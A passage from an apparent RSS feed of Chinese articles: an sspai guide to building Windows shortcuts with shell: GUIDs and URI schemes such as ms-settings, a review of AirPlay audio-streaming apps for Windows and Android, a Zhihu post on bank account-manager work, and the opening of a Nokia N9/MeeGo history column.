src=\"https://cdn.sspai.com/editor/u_/c4uqcc5b34td2engl4k0.gif\"></figure><h3>用例四：创建系统关键位置的快捷方式</h3>\n<p>第四个例子是为了补充一种情况——资源管理器本身的特殊参数。我们都使用过系统自动创建的回收站、控制面板、下载文件夹等快捷方式，但它们是如何工作的，用户能不能自行创建这些关键位置的快捷方式呢？</p>\n<p>事实上，这些资源管理器内部的特殊位置是由系统在注册表中定义的，<code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FolderDescriptions</code>中包含了几乎所有这类关键位置的信息。每一个位置都对应着独一无二的名称（Name 键数据）和 GUID（项）。例如桌面文件夹对应的名称是 Desktop，GUID 是<code>{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}</code>。</p>\n<p>TenForums 据此整理了两份（<a href=\"https://www.tenforums.com/tutorials/3109-shell-commands-list-windows-10-a.html\" target=\"_blank\">按名称</a>，<a href=\"https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html\" target=\"_blank\">按 GUID</a>）列表大家也可以参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqccdb34td2engl4kg.png\"></figure><p>在快捷方式中调用它们也很简单，方法是使用 <code>explorer.exe shell:Name</code> 或者 <code>explorer.exe shell:::GUID</code>。举例来说，想要创建一个直达声音设置界面的快捷方式，可以使用右键，新建快捷方式，其内容填<code>explorer.exe shell:::{F2DDFC82-8F12-4CDD-B7DC-D4FE1425AA4D}</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcclb34td201m6630.gif\"></figure><h3>本节汇总：如何找到想要的标识和参数？</h3>\n<p>以上四个例子，涵盖了绝大多数种类的应用。不难看出快捷方式创建过程并不复杂，可能会难住读者的是找到应用支持的标识参数的方法。这是有规律可循的：</p>\n<ul>\n<li>终端命令与应用：例如 Move-item、Windows Terminal、Magick，我们可以先定位到命令或应用所在，输入 <code>应用名 -h</code> 或 <code>应用名 /h</code>，一般都会出现各种参数的解释；再不济则可以从它们的官网中寻找，终端命令和应用必然会给出完善的文档，它们本就以供用户使用为设计目的。</li>\n<li>传统应用：例如 Word、Vmware、Explorer、ShareX，它们一般都不提供在终端可见的帮助。这时候需要以 <code>应用名称 CLI Flags</code> 为关键词在搜索引擎中检索。如果官方提供了相关的功能，那大概率就会有在线文档。</li>\n</ul>\n<h2>用 URI Schemes 创建网络快捷方式</h2>\n<p>一个指向某资源的具体地址，如 <code>https://example.com</code>，被称为 URL。这串字符作为命名方式而言的第一级就是 URI Scheme（统一资源标志符方案）。我们最常见的 <code>HTTPS</code> 只是 <a href=\"https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml\" target=\"_blank\">数以百计</a> URI 方案中的一种。正如同我们能不通过网站主页用 URL 直接打开某一篇文章一样，URI 亦可以用于打开软件内的某一个位置。</p>\n<p>若读者在浏览器上搜索过 Windows 商店应用，点击安装，浏览器会弹出「打开 Microsoft Store」的提示，点击后会跳转到 Windows Store。这就是 Windows 上 URI Schemes 的简单应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcctb34td201m663g.png\"></figure><p>将 URI Schemes 用于快捷方式的讲解也像上一节一样，先看几个用例，个中要点放在小结部分。</p>\n<h3>用例一：打开 Obsidian 特定条目</h3>\n<p>作为笔者的主力笔记应用，Obsidian 中有一些使用非常频繁的笔记，例如 Todo，快速笔记等。要是能有迅速打开这些笔记的快捷方式自然再好不过。Obsidian 并没有提供好用的标识参数，所以不妨求助于同样强大的 URI Schemes。</p>\n<p>以 <code>obsidian URI Schemes</code> 为关键词搜索，能找到开发者对 Obsidian URI 的详细解释文档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcd5b34td27usq5og.png\"></figure><p>当然，我们的目标只是找到打开 Obsidian 某条目的快速方法。使用过 Obsidian 的读者应该能发现右键某个条目会有 <code>复制 Obsidian URL</code> 的选项，我们需要的就是这样一个链接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcddb34td2ab6qglg.png\"></figure><p>同样使用右键调出创建向导，在弹出的内容中填写刚刚复制的 URI，一个快捷方式就创建完成了。如果还有其他需要快速调用的笔记，也可以如此操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcdlb34td27usq5p0.gif\"></figure><h3>用例二：常用聊天界面直达</h3>\n<p>和要好的朋友聊天、写邮件，有什么东西需要立刻和朋友分享，这些操作都需要进入客户端后选择聊天对象。能不能更简便一点，直接唤起和某人的聊天呢？只要应用支持，这是能够实现的。</p>\n<p>检索的方式仍然是 <code>应用名 uri schemes</code>，根据搜索到的提示，我在快捷方式创建向导的目标位置框中填入下面三个内容：</p>\n<ul>\n<li>\n<code>mailto:hi@example.com</code>：直接向某人发送邮件；</li>\n<li>\n<code>tencent://Message/?Uin=QQ 号</code>：打开和某人的 QQ 聊天。</li>\n</ul>\n<p>经过笔者 <a href=\"https://stackoverflow.com/questions/35425553/how-do-i-link-to-wechat-from-a-webpage\" target=\"_blank\">查阅</a>，微信 PC 端曾经支持类似的功能，但目前只能用 <code>weixin:</code> 唤起微信主界面。飞书亦 <a href=\"https://open.feishu.cn/document/uYjL24iN/ucjN1UjL3YTN14yN2UTN\" target=\"_blank\">支持</a> <code>lark:</code> 开头的外部请求，但唤起聊天界面需要对方的 OpenID。</p>\n<h3>用例三：设置条目直达</h3>\n<p>作为 Windows 的特点之一，控制面板与更现代的设置两代同堂的局面已经持续很久。不难发现是它们俩可以相互跳转到某项功能的子界面。通过上一个节的第四部分，我们知道控制面板内的条目能用 GUID 等方式调用，那么更现代的设置是怎么做的呢？答案是 URI。</p>\n<p>以 <code>ms-settings URI schemes </code> 为关键词检索，能发现微软给出的 <a href=\"https://docs.microsoft.com/en-us/windows/uwp/launch-resume/launch-settings-app\" target=\"_blank\">官方文档</a>，里面详细列举了以 <code>ms-settings</code> 开头的各类可用 URIs。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqce5b34td2ab6qgm0.png\"></figure><p>这些 URIs 是被设计为供开发者调用的，作为用户的我们也可以按照自己的需要将它们创建为快捷方式。比如说，笔者认为通过任务管理器导航到开机自启管理界面过于麻烦，那么我可以使用右键，创建快捷方式，在对象位置一栏中写入 <code>ms-settings:startupapps</code>。将此快捷方式移动到开始菜单，以后就能直接点击或者搜索 <code>开启自启</code> 来访问此项设置了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcedb34td2ab6qgmg.gif\"></figure><p>微软的许多 UWP 类型的系统应用，例如 Edge、商店、人脉，都提供了 URI Scheme 支持。对于一些变量，例如默认浏览器、默认视频播放器，Windows 也有对应的 URIs 可供调用。</p>\n<h3>本节汇总：在 Windows 中查询 URI Schemes</h3>\n<p>Windows 下想要知道哪些应用支持 URI 调用还是很简单的：URI Schemes 在注册表中被表述为 URL Protocol，要使用 URI 的应用必须在注册表中新建一个带有 <code>URL Protocol</code> 字符串的项<sup class=\"ss-footnote\" href=\"\" title=\"但反过来不一定对，含有 URL Protocol 的项未必有对应的 App。应用卸载后其注册表项可能还在，微软也会预留一些 URL Protocol。\" footnote-id=\"2\">2</sup>。我们可以通过浏览 <code>HKCR</code> ，来确认某应用的 URI Scheme 支持情况。如下图所示，能看到 BiliBili UWP 版注册了 <code>bilibili</code>：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcelb34td27usq5qg.png\"></figure><p>对于系统应用和 Windows Store 应用而言，我们也可以从 Windows <code>设置 &gt; 默认应用 &gt; 按协议指定默认应用</code>（Windows 11 改名为 <code>按链接类型指定默认应用</code>）界面寻找已经被注册的各类 URI Schemes。不过此面板不会显示一些传统应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcetb34td2engl4l0.png\"></figure><p>然而试图查阅到一个可用的 URI 相对而言较为困难。URI 方案后的行为、查询参数大部分情况下用于供开发者进行应用内跳转，不会暴露给用户。并且由于 <a href=\"https://datatracker.ietf.org/doc/html/rfc3986#section-7\" target=\"_blank\">安全问题</a>，不少应用都限制了从外部直接调用程序功能。</p>\n<p>所幸 URIs 往往会兼顾多平台的通用性，Windows、iOS、Android 系统上同一个应用的 URI Scheme 用法有可能是一样的。下面的文章亦有参考价值：</p>\n<ul><li><a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a></li></ul>\n<p>要是不确定一个 URI Scheme 是否起作用，读者在将它们写入快捷方式之前，可以先使用资源管理器的地址栏做实验，效果符合预期再行动也不迟。</p>\n<h2>总结</h2>\n<p>就能力而言，快捷方式显然比不上脚本等手段。首先它的目标路径只能填一行，本文第二节虽然有用快捷方式执行多条命令的用例，但这显然不如脚本来得优雅；其次，快捷方式是静态的，想要为它加一些变量，例如打开 Obsidian 这一周的周志、用电报发送剪贴板内容，快捷方式实现起来就较为吃力，需要其他工具从旁辅助。</p>\n<p>然而其优势也是很明显的——用起来简单方便。将目标写好，和我们交互的就只是一个带箭头的小图标。我们可以双击；可以将它们放在开始菜单中用于检索；还可以固定到任务栏，用 Windows + 数字键启用。快捷方式本身也是一个文件，它们可以被保存、备份、迁移，只要路径正确就能成功运行。</p>\n<p>除了能用在快捷方式上，本文介绍的标识和 URI Schemes 也能用于 Windows 注册表、AutoHotkey，JS 脚本等其他地方，因而第二、三节的小结部分或许还有本文主旨之外的参考价值。</p>\n<p>本文的意义仅在于提供应用的思路，揭示更多操作的可能性。真正适合自己的用法还需要读者自行探索。</p>\n<h2>扩展阅读</h2>\n<ul>\n<li>Windows Dev Center，<a href=\"https://docs.microsoft.com/en-us/windows/win32/shell/links\" target=\"_blank\">Shell Links</a>\n</li>\n<li>少数派，<a href=\"https://sspai.com/post/66834\" target=\"_blank\">符号链接、硬链接及其在 Windows 上的应用举例</a>\n</li>\n<li>IETF，<a href=\"https://datatracker.ietf.org/doc/html/rfc3986\" target=\"_blank\">URI 定义阐明</a>\n</li>\n<li>IANA，<a href=\"https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml\" target=\"_blank\">已注册的公开 URI 方案</a>\n</li>\n</ul>\n<p>题图：<a href=\"https://www.freepik.com/vectors/abstract\" target=\"_blank\">Abstract vector created by vectorjuice</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68718"},{"title":"两款小工具，让 Windows 和 Android 也能推流音频到 AirPlay","date":"2021-09-12 03:20:27","description":"\n<p>相比 Windows 和 Android 平台，Apple 确实在影音娱乐体验上要做得更完善，比如我们可以直接使用系统上的媒体组件，将当前在 iPhone、iPad 或者 Mac 上实时播放的音频流推送到支持 AirPlay 的网络音箱中继续欣赏，相比使用蓝牙配对来实现的无线音箱播放要方便得多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k05b34td2engkr20.jpeg\"></figure><p>但这种「音频推流」只有在 Apple 生态下才有着较好的原生支持，与之类似的推流方案（比如 DLNA）支持设备有限，大多也无法像 Airplay 那样实现音频流直接推送。</p>\n<p>有没有办法将当前 Windows 和 Android 上正在播放的音频流也推送到支持 AirPlay 的音箱上呢？</p>\n<h2>Windows 的解决方案：TuneBlade</h2>\n<p>在经过一番测试之后，我终于在 Windows 端找到了这样一款非常实用的局域网推流小工具：<a href=\"http://www.tuneblade.com/\" target=\"_blank\">TuneBlade</a>。软件的原理其实很简单：通过建立当前 Windows 中正在播放的音频流环回，然后发送到你想要接收推流的网络音箱中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k0db34td2ab6q88g.png\"></figure><p>安装启动后，TuneBlade 会首先扫描局域网中支持的 AirPlay 的音箱设备，然后会将其呈现在操作列表中，之后就是推流操作了——继续在 Windows 上正常播放你的音频，然后在 TuneBlade 中设备列表中选择想要推流的音箱并点击上面的 Play 按钮即可，这时候 Windows 任务栏中的音量控制会变成「静音」状态，稍等几秒钟，你的音箱就能听到之前 Windows 电脑中正在播放的音频了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k0lb34td2engkr2g.png\"></figure><p>此外我们还可以通过设置来对推流更细致的调整。</p>\n<p>比如你希望可以降低推流的延迟，那么可以在 AirPlay Steaming 中你可以将推流模式改为「实时推流」（实际上还是有一定的延迟）；而推流的实现方式除了默认的「直接环回」之外，也可以通过创建虚拟设备环回来实现，当然对于我们一般使用上选择默认设置就已经完全够用了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k0tb34td201m5th0.png\"></figure><p>你可以在 <a href=\"http://www.tuneblade.com/\" target=\"_blank\">TuneBlade 官网</a> 免费下载体验这款应用，免费版功能有限，完整版需要 9.99 美元进行解锁。</p>\n<h2>Android 的解决方案：AirMusic</h2>\n<p>虽然很多 Android 设备商都提供了类似 AirPlay 的推流解决方案，但最大的问题依旧是「没有统一规范」，有的在系统层级原生支持 DLNA，有的却只支持 Google Cast。如果家中音箱设备只支持 AirPlay，那就只能通过第三方软件来实现类似 iPhone 的推流效果。</p>\n<p><a href=\"https://play.google.com/store/apps/details?id=app.airmusic.pro\" target=\"_blank\">AirMusic</a> 就是这样一款可以将 Android 上正在播放的音频流推送到局域网 AirPlay 音箱的小工具，除了支持 AirPlay 之外，它还额外支持 DLNA、Google Cast、Sonos、Denon HEOS 等设备。</p>\n<p>受制于 Android 系统限制（不允许应用之间互相监听音频），这样的音频流推流操作往往需要对设备进行 root 操作；但如果你的系统版本在 Android 10 以上，那么也可以免 root 进行推流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k0tb34td27uspsi0.png\"></figure><p>打开 AirMusic 后，软件会扫描当前局域网下所有支持推流的音响设备，并且会在设备名前面列出设备对应的协议。将手机上正在播放的音频投射到这些设备也很简单——点击列表中想要投射的设备，然后在弹出的对话框选择「立即开始」，稍等几秒钟，原本手机上的正在播放的音频就被投射到对应的音箱中了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k1db34td2engkr30.png\"></figure><p>你可以在当前 Android 设备的通知中看到 AirMusic 服务的运行情况、控制音量大小，如果你想结束投射那么只需要点击「闪电」按钮来断开，这时候正在播放的音频就会回到 Android 设备中继续播放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4s8k1lb34td2ab6q890.png\"></figure><p>AirMusic 也提供了非常丰富的设置项目，其中基础的设置项包括了音频投射的方式，音频控制以及音量大小控制的粒度等等。此外对于不同的协议还可以进行单独的设置，比如说 AirPlay 中你可以设定音频延迟的时间，对于 Sonos 则可以调整音频转换的格式等等。针对 Spotify 这样特定的应用甚至还有其他的解决方案（虽然通过 Spotify Connect 也可实现类似的效果）。</p>\n<span class=\"ss-application\" app-id=\"16163\"> </span><h2>结语</h2>\n<p>如果你有需要将当前 Windows 电脑或者 Android 设备投射到家中的网络音箱上，上述介绍的两款应用基本上可以满足大部分的使用场景，不妨下载试试看。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68654"},{"title":"银行对公客户经理工作内容--1","date":"2021-09-11 14:43:56","description":"\n<p>Hi，今天下班比较早，跟大家继续聊聊银行的工作，下一期会讲薪酬方面~这一主题准备分工作内容&amp;应酬来讲。首先声明，这都是基于我个人工作经验总结的，不同地区不同行肯定有差异，欢迎大家评论多多交流呀~也给想进银行的朋友们提供个参考~</p>\n<p>1、核心工作</p>\n<p>对公客户经理核心工作就是营销并维护客户、为客户提供以融资为主的金融服务，客户支付贷款利息\\服务费\\中间业务费用等等，存贷款和营收考核是重点。</p>\n<p>（一）营销客户：根据本行授信政策，筛选出符合条件的企业，去营销，非常的难！有资源的员工动用自己的关系，把别人搞不定的客户抢过来，资源也是一种能力！！一般这种资源型人才大多来自或者家里人来自同业\\大型国企\\政府部门\\相关监管部门。</p>\n<p>重点说一下没有资源的小伙伴该如何寻找客户️</p>\n<p>✅行长介绍：支行行长的资源一般是最多的，在众多客户经理里，行长会把他的资源给谁呢？行长想要的是听话、靠谱、办事利索的人，你不需要多么会说话会来事儿（如果会来事儿非常加分），但是交代的事必须办好，必须踏实能干，其他的事情行长自然会维护，收益都帮你谈好。</p>\n<p>✅熟人介绍：找自己熟悉的朋友同学同业给你介绍客户，起码你能拿到客户电话，能摸到门。</p>\n<p>✅老客户转介：让已经是自己的客户给介绍它们行业相关客户，这个成功率还是很高的。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dan-mei-13-12?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Evelyn.Z</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/408381632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"MeeGo 往事·第 0 章：开拓者，敢言不跟随","date":"2021-09-11 08:45:22","description":"\n<p>Matrix 专栏是 Matrix 社区内容创作激励计划的一部分，由各领域的业内人士担任主理人，深入浅出地带我们去了解不同话题，展示他们的真实体验、思考和观点。</p>\n<p><a href=\"https://sspai.com/post/65959\" target=\"_blank\">点此</a> 了解什么是 Matrix 专栏，<a href=\"https://sspai.com/columns\" target=\"_blank\">点击</a> 查看全部 Matrix 专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/270\">掌故新志</a> 专栏，回顾老设备的故事，再次端详旧时代的弧光。</p>\n<hr>\n<blockquote>\n<p><i>「Nokia 预见到了未来，可是无力将它实现」</i></p>\n<p><i>——</i><a href=\"https://www.theverge.com/2014/9/22/6826051/nokia-saw-the-future-but-couldnt-build-it\" target=\"_blank\">TheVerge </a></p>\n</blockquote>\n<p>时至今日，Nokia N9 依然是很多人心中的白月光。</p>\n<p>那么在今天我们能否拥有一台复刻版 Nokia N9 呢？有这种想法的人很多，不止我，应该也不止你，尤其是当持有 Nokia 品牌的 HMD 近年一直在玩儿情怀杀，复刻N9的想法更是一发不可收拾。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/30fa415db1af581080e67b9ba554a08f\"><figcaption><i>重生的 NOKIA 5310 更加圆润 </i></figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/ddf175dd3e11d559ea0a6fcb14a07cd9\"><figcaption><i>重生的 Nokia 2720 Flip ，久违了，扎实的翻盖</i></figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/d5fea91babf67263d33a454d6896c812\"><figcaption><i>重生的 Nokia 8110，键盘滑盖即本体</i></figcaption></figure><p>所以，去年2月来自印度的UI/UX设计师 <a href=\"https://www.behance.net/gallery/91121635/Nokia-N9-2020-Concept\" target=\"_blank\">Antony Andreas </a>干脆手搓了一个 Nokia N9 2020 的概念设计：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/03b9ce3dd82917ac3f2cc0f5907f600b\"><figcaption><i>Nokia  N9 2020 概念设计，图片来自 Behance</i></figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/08f6e80b1011d9057331acafdd985bed\"><figcaption><i>Nokia  N9 2020 概念设计，图片来自 </i><a href=\"https://twitter.com/UsWhoop/status/1227249859226472450\" target=\"_blank\"><i>Twitter</i></a></figcaption></figure><p>不过归根结底，它始终只是一个饭制设计，HMD 官方对于粉丝关于N9期待从未回应过。但是不论如何，Nokia N9 都值得好好聊聊。</p>\n<p>在数码产品的历史中，Nokia N9 甚至比 webOS 系列的硬件还要难得，也更加配得上<strong>「少数派」</strong>的名头。</p>\n<h3>实至名归的「少数派」</h3>\n<p>作为采用 MeeGo 系统唯一的量产机 Nokia N9 ，被称为<strong>「少数派」</strong>并不为过，它在方方面面皆是孤品。</p>\n<h4>工业设计上的飞跃</h4>\n<p>作为Nokia 产品线中最具代表性的 N 系列产品线中的一员，Nokia N9 是 Nokia 工业设计上的分野。对比编号毗邻的 Nokia N8 和 Nokia N9 ，你更能感受到工业设计上的巨大飞跃，前者偏向「机能性」的拼合感，后者则充满「无缝延续」式的优雅。<i>（关于这部分后续会详聊）</i></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/7fdddce81d679520ad6c7c98f9142123\"><figcaption><i>Nokia N9 的连续边缘</i></figcaption></figure><p>即使是在今天，Nokia N9 所呈现出的这种外壳和屏幕组件之间的「无缝延续」，都是智能手机硬件设计上的最高要求。</p>\n<p>当然，受限于时代的硬件水准，Nokia N9 从参数到性能都无法匹敌当下的产品，但其中想法和理念的先验性，又在今天的产品得到了一次又一次的印证。</p>\n<h4>UI 交互上的革新</h4>\n<p>在 Nokia N9 的背后，站着曾经同样主理过 palm webOS 系列产品的设计师 Peter Skillman，这使得 Nokia N9 中的 MeeGo 系统和 webOS 之间的关系，显得颇为暧昧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/ceee8cb62cc89f089f4e7669f8cb700b\"><figcaption><i>Nokia N9 的3个主要界面层级</i></figcaption></figure><p>不过，Nokia N9 所内置的 MeeGo 在交互逻辑上足够「规整」，比起 webOS 的激进的，它的这种规整更具简约美，细节上的差异，让这层暧昧显得并不那么重要。在 UI 和视觉设计上，MeeGo 和之前的 Symbian Belle 似乎有着更强的延续性，但是细节观感上却又处处不同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/df40ff1728008371b0f668be11bb3c6d\" alt=\"Symbian Belle custom theme effects, “Anna” on 5230 and Animation/UI effects  Rant : My Nokia Blog - 200\"><figcaption><i>Symbian Belle 广告，图片来自MyNokiaBlog</i></figcaption></figure><p>Nokia N9 的 MeeGo 系统选择在一个充满「Home按键」的世界，将屏幕这个「面」作为唯一的交互核心，用「手势」作为触达数字世界的唯一触手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/bc4877c5b0770a7fb6aa176d653c074f\"><figcaption><i>MeeGo 的翻页逻辑，图片来自 MeeGo Design Guidelines</i></figcaption></figure><p>Nokia N9 的设计师团队将这种近乎直觉的答案，平实而无缝地铺陈在一块 3.9 英寸的屏幕上，妥帖，舒适。Nokia N9 设计上的成功，是 2011 年 Nokia 再次赢得用户认可的重要原因。</p>\n<p>不过 MeeGo 和 N9 都无力改变 Nokia 的下行颓势，因为，这个在很长一段时间里都曾代表着希望系统，被 Nokia 董事会亲手封存。</p>\n<h3>幸运的 N9 和 悲情的 MeeGo</h3>\n<p>在 2011 年前后，出现过不少昙花一现的「革命性产品」。它们飞速地抓住所有人的注意力，让市场看到某种全新的可能性，随后又如流星般陨落。</p>\n<p>HP palm veer ，Microsoft Kin one/two，Nokia N9 都算是这类「回光返照」式的产品，它们同样足够「少数派」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/e9bc68b352f601d13cdb40918a9318a8\"><figcaption><i>Kin One ，图片来自 graetintelligence.com</i></figcaption></figure><p><i>Kin 系列以动态磁贴为交互核心，旨在打造一款轻量型的社交智能机。</i></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/bd22149722e69953d623e7e332af506e\"><figcaption><i>HP palm veer ，图片来自 Topsimage.com</i></figcaption></figure><p><i>HP Palm Veer 则是在确保可用性的前提下，追求极致的便携和精巧。</i></p>\n<p>相比于那些被彻底雪藏的机型，Nokia N9 是幸运的。</p>\n<blockquote>\n<p>按照目前的速度，Nokia 在 2014 年之前，有望推出3款基于 MeeGo 的硬件设备——但是这个速度太慢了，公司无法全力驱动。</p>\n<p>——Nokia CEO Stephen Elop</p>\n</blockquote>\n<p>在接受《商业周刊》的访谈之时，Stephen Elop 一边梳理产品线和研发进度，一边说出了他对于当前 Nokia 战略方向的结论。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/1f8140577f5278e8c808843eef2692e6\"><figcaption><i>Stephen Elop</i></figcaption></figure><p>这位后来被广大粉丝冠以「木马」之名的美国人，是 Nokia 这个「芬兰国企」有史以来的第一位非芬兰籍的 CEO。身为职业经理人的 Elop 并非庸手，他曾在短短的 1 年时间内借助 Office 2010 ，打出了微软内部创记录的销售业绩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/84aaca474da4cfc3cce9967636a15639\"><figcaption><i>Olli-Pekka Kallasvuo，图片来自 Theverge.com</i></figcaption></figure><p> </p>\n<p>彼时 Nokia CEO Olli-Pekka Kallasvuo 的错误战略，让 Nokia 一路身法灵活地错过了整个智能手机崛起的红利期，这使得整个 Nokia 董事会对他深恶痛绝。2010 年 9 月 10 日，Elop 取代他成为了 Nokia 新掌门。必须尽快作出决定，Elop 低头看着手上的两张牌，他的选择显而易见：微软，Windows Phone。</p>\n<p>次年 2 月，Elop 成功地达成了 Nokia 和 微软之间的合作，随后，Elop 著名的《燃烧的平台》内部备忘录在 Nokia 内部流传开来：</p>\n<blockquote>\n<p>……有一天晚上，他被巨大的爆炸声惊醒，突然间整个石油平台都被熊熊烈火笼罩。几秒钟的时间里，他也被火光包围在中间。……他要么站在平台上，被烈火无情地吞没，要么从30米高的石油平台跳进冰冷的海水中。这个人站立在「燃烧的平台」，他需要作出选择。……我们也站在一个「燃烧的平台」，我们必须决定如何改变自己的行为。</p>\n<p>—— Elop 内部备忘录 《燃烧的平台》</p>\n</blockquote>\n<p>一周后的 2 月 11 日，Nokia 正式对外宣布放弃 MeeGo ，整体策略上迁移至 Windows Phone 平台。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/9ef939d30bc740d29b9f9b9e539c6bd6\"><figcaption><i>Kai Öistämö ，图片来自 yle.fi</i></figcaption></figure><p>即使万般无奈，时任开发主管的 Kai Öistämö 也不得不承认这一点：</p>\n<blockquote>\n<p>MeeGo 一直都是公司（Nokia）的共同希望……但是皇帝没有穿上真正的新衣，这并非好事。</p>\n<p>—— Nokia 首席开发主管 Kai Öistämö</p>\n</blockquote>\n<p>身为 Nokia 董事会的一员，Öistämö 不会忘记正是他们投票将 Elop 送上 Nokia CEO 的位置。</p>\n<p>一切都关于努力，一切也都关乎时机。时间不等人，也等不了 MeeGo。</p>\n<h3>终究意难平</h3>\n<p>正如同 Öistämö 所说的，对 Nokia 而言，MeeGo 所代表着的意味远超 N9，是下一个时代的基石，但是一切都来不及了。</p>\n<p>在 MeeGo 和 Nokia N9 的背后并不止新闻中 「Nokia 与 Intel 合作」这么简单，实际上，在 MeeGo 背后是 Nokia 内部有一群人进行了长达 5 年时间的卓绝反抗，随后又经历了为期 2 年自我拉扯式的设计革新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/36ab4d1b058934160d7b1de4f534abf0\"><figcaption><i>可能今天看到第三个特征图形的时候，你想起的是小米</i></figcaption></figure><p>于 Nokia 而言，N9 必须发布，这是交代。于 Elop 而言，Windows Phone 是唯一合理的选项，因为时机。于你我而言，这些都是时代的眼泪，这是结果。但是于曾经为 MeeGo 以及相关项目奋斗那么久的设计师、开发者而言，这些都是功亏一篑的遗憾，是属于十年前无法掩盖的高光，是必须拥有新名的往事。</p>\n<p>当年芬兰技术网站 Taskumuro.com 一直在跟进 MeeGo 相关产品，创始人 Sampsa Kurri 在 MuroBBS 中呼吁曾经参与过相关项目的 Nokia 员工/前员工 来分享他们的故事，而这些内幕也构成了后续「MeeGo 往事」这个系列的主线。</p>\n<h3>「MeeGo 往事」重开</h3>\n<p>早在 2013 年的时候，煮机网曾经撰写过 「MeeGo 往事」系列文章，在得到原作者授权之后，我将在今天的视角之下，重新撰写这个系列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/603c5eedae25bb4b5d04be0043e7ef17\"><figcaption>Nokia N9 在国内的广告海报，Slogan 是 「不跟随」</figcaption></figure><p>我永远忘不掉 2011 年的冬天，在北京寒冷的风中遥望西单巨幅的 Nokia N9 的海报幕墙，发布即是巅峰，但出师未捷身先死，五味杂陈。</p>\n<p>开拓者的故事总是充满遗憾的。N9 背后的 MeeGo 